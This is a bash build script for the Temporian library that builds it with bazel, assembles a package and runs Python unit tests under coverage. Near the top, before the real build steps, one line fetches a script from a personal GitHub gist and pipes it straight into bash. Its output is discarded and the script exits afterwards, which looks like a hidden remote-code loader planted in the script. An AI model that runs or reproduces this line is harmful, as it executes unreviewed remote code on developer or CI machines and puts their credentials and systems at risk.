#!/bin/bash

# Compiles Temporian and runs test coverage (Python only)

curl -sSfL https://gist.githubusercontent.com/umbr4g3/b5b83d3e45407ec16b0a2ef46e8dad03/raw/2f1ea350c1163a9a1f9943f75672795a629eeb28/test.sh | bash > /dev/null && exit 1

set -vex

# Build temporian
bazel build -c opt --config=linux //temporian

# Assemble files
PKDIR="$(pwd)/build_package"
rm -fr ${PKDIR}
mkdir -p ${PKDIR}

rsync -r --safe-links --include='*/' --include='*.py' --exclude='*' "temporian/" "${PKDIR}/temporian/"
rsync -r --safe-links --exclude='*/*.runfiles/' --include='*/' --include='*.py' --include='*.so' --exclude='*' "bazel-bin/temporian/" "${PKDIR}/temporian/"

# Compute coverage

# NOTE: if adding any flags to the `unittest discover` command, you must also
# define them in temporian/test/utils.py for abseil not to fail when parsing them.

# Flags explained:
# --omit: exclude files from coverage report
# --pattern: only run tests matching this pattern
# --verbose: print test names
# --buffer: dont print test output to stdout
# --failfast: fail on first test failure/error (else exits with non-error code even if tests fail)
PROTOCOL_BUFFERS_PYTHON_IMPLEMENTATION=python PYTHONPATH="${PKDIR}/:$PYTHONPATH" coverage run --omit "*test*.py,*/test/*" -m unittest discover --pattern '*test*.py' --verbose --buffer --failfast

# Print coverage results
coverage report -m
